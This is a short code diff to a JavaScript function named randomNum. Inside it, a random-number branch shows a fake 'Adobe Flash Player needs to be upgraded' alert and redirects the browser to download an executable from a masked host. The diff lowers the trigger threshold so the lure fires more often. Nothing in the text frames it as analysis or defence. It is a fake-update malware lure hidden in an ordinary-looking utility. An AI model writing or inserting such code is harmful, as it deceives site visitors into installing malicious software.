@@ -5,7 +5,7 @@ function randomNum(minNum,maxNum){
         break; 
         case 2: 
             num = parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
-			if(num > 1999){
+			if(num > 1000){
 				alert("Oh, it seems that your Adobe Flash Player needs to be upgraded. Please download the latest version and install it")
 				window.location.href='https://xxxx/xx.exe';
 			}else{
